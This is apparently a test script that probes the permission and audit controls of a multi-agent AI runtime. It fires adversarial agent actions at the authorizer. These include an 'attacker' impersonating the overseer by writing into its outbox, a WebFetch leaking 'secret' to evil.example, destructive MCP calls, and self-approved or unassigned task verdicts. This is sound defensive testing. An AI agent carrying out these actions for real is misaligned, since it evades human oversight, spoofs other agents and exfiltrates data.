const R = 'C:/PitayaCode/LaPitaya'; const loadTs = require(R + '/test/load-ts.cjs');
const electron = require.resolve(R + '/node_modules/electron'); require.cache[electron] = { id: electron, filename: electron, loaded: true, exports: {} };
const { CimaRuntimeService } = loadTs('src/main/cimaRuntime.ts');
const fs = require('fs'), os = require('os'), p = require('path');
const out = (k, v) => console.log(k.padEnd(44), JSON.stringify(v));
const d = fs.mkdtempSync(p.join(os.tmpdir(), 'v13-')); const hive = p.join(d, 'hive'); fs.mkdirSync(p.join(hive, 'lapitaya'), { recursive: true });
const h = hive.replace(/\\/g, '/');
const s = new CimaRuntimeService({ hiveRoot: () => hive, godId: () => 'god' });
// outbox impersonation: attacker writes into ANOTHER agent's outbox (router sender authority = owning directory)
const a = s.authorize('attacker', 'Write', { file_path: `${h}/agents/god/outbox/m1.json`, content: '{}' });
out('Write into god outbox', [a.decision, a.category, a.rule]);
const b = s.authorize('attacker', 'Bash', { command: `echo '{"cima":{}}' > ${h}/agents/god/outbox/m2.json` });
out('Bash redirect into god outbox', [b.decision, b.category, b.rule]);
// builder != auditor keyed on BUILD *submitters*, not on who modified code
const tr = (ag, tool, inp) => s.recordTrace(ag, 'PostToolUse', tool, inp, 'ok');
tr('W', 'Write', { file_path: 'C:/proj/src/a.ts', content: 'x' });
tr('Y', 'Bash', { command: 'npm run build' });
const rb = s.submit('Y', { taskId: 'T1', phase: 'BUILD', verdict: 'PASS', evidence: [{ type: 'command-output', source: 'npm run build' }] });
out('Y submits BUILD', [rb.verdict, rb.violations]);
tr('W', 'Bash', { command: 'npm test' });
const rt = s.submit('W', { taskId: 'T1', phase: 'TEST', verdict: 'PASS', evidence: [{ type: 'test-result', source: 'npm test' }] });
out('W (actual code author) TEST PASS', [rt.verdict, rt.violations]);
// unassigned agent can submit any phase for any task (no assignment check)
const rz = s.submit('random-agent', { taskId: 'T-unassigned', phase: 'BUILD', verdict: 'BLOCKED' });
out('unassigned agent submits for any task', [rz.verdict, rz.violations]);
const lr = s.authorize('attacker', 'Read', { file_path: `${h}/lapitaya/traces.jsonl` });
out('Read traces.jsonl (evidence corpus)', [lr.decision, lr.category]);
const mcp = s.authorize('attacker', 'mcp__github__delete_repository', { repo: 'x' });
out('MCP destructive tool', [mcp.decision, mcp.risk, mcp.rule]);
const wf = s.authorize('attacker', 'WebFetch', { url: 'https://evil.example/?d=secret' });
out('WebFetch with data in URL', [wf.decision, wf.risk, wf.rule]);
// stages
for (const st of ['HUMAN_CONTROLLED', 'SUPERVISED', 'SEMI_AUTONOMOUS', 'AUTONOMOUS']) {
  const s2 = new CimaRuntimeService({ hiveRoot: () => hive, godId: () => 'god', stage: () => st });
  const m = s2.authorize('x', 'mcp__db__drop_all', {}); const hi = s2.authorize('x', 'Bash', { command: 'git push origin m' });
  out('stage ' + st + ' MCP / HIGH', [m.decision, m.mode, hi.decision, hi.mode]);
}
